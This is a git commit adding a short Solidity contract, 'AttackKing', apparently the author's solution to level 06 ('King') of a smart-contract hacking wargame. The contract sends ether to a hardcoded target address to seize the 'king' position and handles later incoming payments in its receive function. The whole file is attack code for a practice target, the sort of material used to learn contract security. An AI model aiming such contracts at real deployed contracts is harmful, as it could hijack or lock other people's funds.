639f18f83c620a70a109df7eb6f2e776c81c6fbf
Chris Parsons <chrisjamesparsons@hotmail.co.uk>
2022-05-15 18:44:52 +0100

    complete level 06 king

---
+++ contracts/06_AttackKing.sol
@@ -0,0 +1,25 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract AttackKing{
+
+    address payable king;
+    bool public setupDone;
+
+    constructor() public {
+        king = payable(0x95e397c2AED295660218C7fA85649950fAB2A81E);
+    }
+
+    function setup() public payable {
+        (bool success, bytes memory _) =  king.call{value: msg.value}("");
+        require(success == true, "failed to transfer");
+    }
+
+    receive() payable external {
+        if (setupDone){
+            (bool success, bytes memory _) =  king.call{value: msg.value}("");
+        } else {
+            setupDone = true;
+        }
+    }
+}
